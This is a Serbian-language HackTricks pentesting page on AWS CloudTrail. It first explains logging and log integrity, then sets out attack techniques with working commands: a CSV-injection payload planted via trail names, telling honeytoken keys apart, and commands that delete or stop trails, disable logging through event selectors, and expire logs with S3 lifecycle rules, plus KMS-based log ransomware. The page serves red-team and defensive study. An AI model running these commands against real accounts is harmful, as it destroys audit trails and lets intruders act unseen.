# AWS - CloudTrail Enum

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **CloudTrail**

AWS CloudTrail **beleži i prati aktivnosti unutar vašeg AWS okruženja**. On snima detaljne **dnevničke zapise događaja**, uključujući ko je šta uradio, kada i odakle, za sve interakcije sa AWS resursima. Ovo pruža evidenciju promena i akcija, pomaže u analizi bezbednosti, reviziji usaglašenosti i praćenju promena resursa. CloudTrail je neophodan za razumevanje ponašanja korisnika i resursa, poboljšanje bezbednosti i obezbeđivanje usaglašenosti sa propisima.

Svaki zabeleženi događaj sadrži:

* Naziv pozvane API metode: `eventName`
* Pozvani servis: `eventSource`
* Vreme: `eventTime`
* IP adresa: `SourceIPAddress`
* Metoda agenta: `userAgent`. Primeri:
* Signing.amazonaws.com - Iz AWS Management Console
* console.amazonaws.com - Root korisnik naloga
* lambda.amazonaws.com - AWS Lambda
* Parametri zahteva: `requestParameters`
* Elementi odgovora: `responseElements`

Događaji se upisuju u novu datoteku dnevnika **približno svakih 5 minuta u JSON formatu**, čuvaju se u CloudTrail-u i na kraju se **isporučuju u S3 približno 15 minuta kasnije**.\
CloudTrail dnevnici mogu se **agregirati preko naloga i preko regiona**.\
CloudTrail omogućava korišćenje **celovitosti dnevnika kako biste mogli da proverite da li su vaše dnevničke datoteke ostale nepromenjene** od trenutka kada ih je CloudTrail isporučio. On kreira SHA-256 heš dnevnika unutar datoteke sa sažetkom. SHA-256 heš novih dnevnika se kreira svaki sat.\
Prilikom kreiranja Trail-a, selektori događaja će vam omogućiti da naznačite Trail za beleženje: upravljačke, podatkovne ili uvide događaje.

Dnevnici se čuvaju u S3 kanti. Podrazumevano se koristi enkripcija sa serverne strane (SSE-S3), tako da će AWS dešifrovati sadržaj za osobe koje imaju pristup, ali radi dodatne bezbednosti možete koristiti SSE sa KMS i svoje ključeve.

Dnevnici se čuvaju u **S3 kanti sa ovim formatom imena**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Gde je BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Primer: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Unutar svake fascikle, svaki dnevnik će imati **ime koje prati ovaj format**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Konvencija za imenovanje dnevnika

![](<../../../../.gitbook/assets/image (29).png>)

Osim toga, **datoteke sažetka (za proveru celovitosti datoteka)** će biti unutar **iste kante** u:

![](<../../../../.gitbook/assets/image (22).png>)

### Agregiranje dnevnika iz više naloga

* Kreirajte Trial u AWS nalogu gde želite da se isporuče dnevničke datoteke
* Dodelite dozvole za odredišnu S3 kantu koja omogućava pristup između naloga za CloudTrail i dozvolite svakom AWS nalogu koji treba pristup
* Kreirajte novi Trail u drugim AWS nalozima i odaberite da koristite kreiranu kantu u koraku 1

Međutim, čak i ako možete sačuvati sve dnevnike u istoj S3 kanti, ne možete agregirati CloudTrail dnevnike iz više naloga u CloudWatch dnevnike koji pripadaju jednom AWS nalogu.

{% hint style="danger" %}
Zapamtite da jedan nalog može imati **različite Trail-ove** iz CloudTrail-a **omogućene** koji čuvaju iste (ili različite) dnevnike u različitim kantama.
{% endhint %}

### Cloudtrail iz svih org naloga u jedan

Prilikom kreiranja CloudTrail-a, moguće je naznačiti da se aktivira cloudtrail za sve naloge u organizaciji i da se dnevnici dobiju u samo jednoj kanti:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

Na ovaj način možete lako konfigurisati CloudTrail u svim regionima svih naloga i centralizovati dnevnike u 1 nalogu (koji treba da zaštitite).

### Provera datoteka dnevnika

Možete proveriti da li su dnevnici izmenjeni pokretanjem

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Dnevnici u CloudWatch-u

**CloudTrail može automatski slati dnevnike u CloudWatch tako da možete postaviti upozorenja koja će vas obavestiti kada se izvrše sumnjive aktivnosti.**\
Imajte na umu da je potrebno kreirati **ulogu** koja omogućava CloudTrail-u da šalje dnevnike u CloudWatch. Ako je moguće, preporučuje se korišćenje AWS podrazumevane uloge za izvršavanje ovih radnji. Ova uloga će omogućiti CloudTrail-u da:

* CreateLogStream: Ovo omogućava kreiranje CloudWatch Logs log stream-ova
* PutLogEvents: Dostavlja CloudTrail dnevnike u CloudWatch Logs log stream-ove

### Istorija događaja

CloudTrail Event History vam omogućava da pregledate u tabeli zabeležene dnevnike:

![](<../../../../.gitbook/assets/image (24).png>)

### Uvidi

**CloudTrail Insights** automatski **analizira** upravljačke događaje pisanja iz CloudTrail staza i **upozorava** na **neobične aktivnosti**. Na primer, ako postoji povećanje događaja `TerminateInstance` koje se razlikuje od uspostavljenih osnova, videćete ga kao Insight događaj. Ovi događaji olakšavaju **pronalaženje i reagovanje na neobičnu API aktivnost** više nego ikad.

Uvidi se čuvaju u istom spremištu kao i CloudTrail dnevnici u: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Bezbednost

| Integritet datoteka CloudTrail dnevnika | <ul><li>Proverava da li su dnevnici izmenjeni (izmenjeni ili obrisani)</li><li><p>Koristi digest datoteke (kreira heš za svaku datoteku)</p><ul><li>SHA-256 heširanje</li><li>SHA-256 sa RSA za digitalno potpisivanje</li><li>privatni ključ u vlasništvu Amazona</li></ul></li><li>Kreiranje digest datoteke traje 1 sat (izvršava se svaki sat)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Zaustavite neovlašćen pristup         | <ul><li><p>Koristite IAM politike i S3 politike spremišta</p><ul><li>tim za bezbednost —> administratorski pristup</li><li>revizori —> samo čitanje pristupa</li></ul></li><li>Koristite SSE-S3/SSE-KMS za enkripciju dnevnika</li></ul>                                                                                                                                        |
| Sprječavanje brisanja datoteka dnevnika | <ul><li>Ograničite pristup brisanju pomoću IAM i politika spremišta</li><li>Konfigurišite S3 MFA brisanje</li><li>Proverite sa Log File Validation</li></ul>                                                                                                                                                                                            |

## Access Advisor

AWS Access Advisor se oslanja na poslednjih 400 dana AWS **CloudTrail dnevnika da bi prikupio svoje uvide**. CloudTrail beleži istoriju AWS API poziva i povezanih događaja napravljenih u AWS nalogu. Access Advisor koristi ove podatke da bi **prikazao kada su usluge poslednji put korišćene**. Analizirajući CloudTrail dnevnike, Access Advisor može utvrditi koje AWS usluge je IAM korisnik ili uloga koristila i kada se ta pristup dogodio. Ovo pomaže AWS administratorima da donose informisane odluke o **usavršavanju dozvola**, jer mogu identifikovati usluge koje nisu korišćene u dužem vremenskom periodu i potencijalno smanjiti preširoke dozvole na osnovu stvarnih šablona korišćenja.

{% hint style="success" %}
Stoga, Access Advisor obaveštava o **nepotrebnim dozvolama koje se daju korisnicima**, tako da administrator može da ih ukloni.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Radnje

### Nabrojavanje
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

Moguće je izvršiti CSV ubacivanje unutar CloudTrail-a koje će izvršiti proizvoljni kod ako se zapisi izvezu u CSV formatu i otvore u programu Excel.\
Sledeći kod će generisati unos zapisa sa lošim imenom Trail-a koje sadrži payload:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Za više informacija o CSV ubacivanju proverite stranicu:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Za više informacija o ovoj specifičnoj tehnici proverite [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Bypass Detekcije**

### HoneyTokens **bypass**

HoneyTokens su kreirani da **detektuju izvlačenje osetljivih informacija**. U slučaju AWS-a, to su **AWS ključevi čije se korišćenje prati**, ako nešto pokrene akciju sa tim ključem, onda neko mora da je ukrao taj ključ.

Međutim, ova praćenja se vrše putem **CloudTrail**-a, i postoje neke **AWS usluge koje ne šalju logove CloudTrail-u** (pronađite [ovde](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html) listu). Neke od tih usluga će **odgovoriti** sa **greškom** koja sadrži **ARN uloge ključa** ako neovlašćena osoba (honeytoken ključ) pokuša da mu pristupi.

Na ovaj način, **napadač može dobiti ARN ključa bez pokretanja bilo kakvog loga**. U ARN-u napadač može videti **AWS ID i ime naloga**, lako je znati ID i imena HoneyToken kompanija, tako da napadač može identifikovati da li je token HoneyToken.

![](<../../../../.gitbook/assets/image (65).png>)

#### **Detekcija HoneyTokena**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) detektuje da li ključ pripada [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* Ako se **`canarytokens.org`** pojavi u imenu uloge ili ID naloga **`534261010715`** se pojavi u poruci o grešci.
* Testirajući ih nedavno, koriste nalog **`717712589309`** i još uvek ima string **`canarytokens.com`** u imenu.
* Ako se **`SpaceCrab`** pojavi u imenu uloge u poruci o grešci.
* **SpaceSiren** koristi **uuids** za generisanje korisničkih imena: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Ako **ime izgleda kao slučajno generisano**, postoji visoka verovatnoća da je to HoneyToken.

{% hint style="danger" %}
Imajte na umu da su sve javne API-je otkrivene kao one koje ne stvaraju CloudTrail logove sada ispravljene, tako da možda morate pronaći svoje...

Ili možete dobiti **Account ID** iz **enkodiranog** unutar **pristupnog ključa** kao što je [**objašnjeno ovde**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) i proveriti Account ID sa svojom listom Honeytokens AWS naloga:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print ("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
{% endhint %}

Za više informacija pogledajte [**originalno istraživanje**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### Pristupanje trećoj infrastrukturi

Određene AWS usluge će **stvoriti infrastrukturu** kao što su **baze podataka** ili **Kubernetes** klasteri (EKS). Korisnik koji **direktno komunicira sa tim uslugama** (kao što je Kubernetes API) **neće koristiti AWS API**, pa CloudTrail neće moći da vidi ovu komunikaciju.

Stoga, korisnik koji ima pristup EKS-u i koji je otkrio URL EKS API-ja može generisati token lokalno i **komunicirati direktno sa API uslugom bez otkrivanja od strane CloudTrail-a**.

Više informacija u:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modifikacija CloudTrail konfiguracije

#### Brisanje tragova
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Zaustavite staze

Da biste zaustavili stazu, koristite sledeću komandu:

```plaintext
aws cloudtrail stop-logging --name <ime-staze>
```

Gde `<ime-staze>` predstavlja ime staze koju želite da zaustavite.
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Onemogući višeregionalno beleženje

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### Onemogući beleženje pomoću selektora događaja

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

U prvom primeru, jedan selektor događaja je dat kao JSON niz sa jednim objektom. `"ReadWriteType": "ReadOnly"` ukazuje da selektor događaja treba da zabeleži samo događaje samo za čitanje (tako da CloudTrail insights neće proveravati događaje za pisanje, na primer).

Možete prilagoditi selektor događaja prema svojim specifičnim zahtevima.

#### Brisanje zapisa putem S3 lifecycle politike

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modifikacija konfiguracije kante

* Obriši S3 kantu
* Promeni politiku kante da odbija svaki upis iz CloudTrail servisa
* Dodaj lifecycle politiku na S3 kantu da obriše objekte
* Onemogući KMS ključ koji se koristi za enkripciju CloudTrail logova

### Cloudtrail ransomware

#### S3 ransomware

Možete **generisati asimetrični ključ** i **CloudTrail enkriptovati podatke** sa tim ključem i **obrisati privatni ključ** tako da CloudTrail sadržaj ne može biti povraćen.\
Ovo je u osnovi **S3-KMS ransomware** objašnjen u:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS ransomware**

Ovo je najlakši način da se izvede prethodni napad sa različitim zahtevima dozvola:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Reference**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
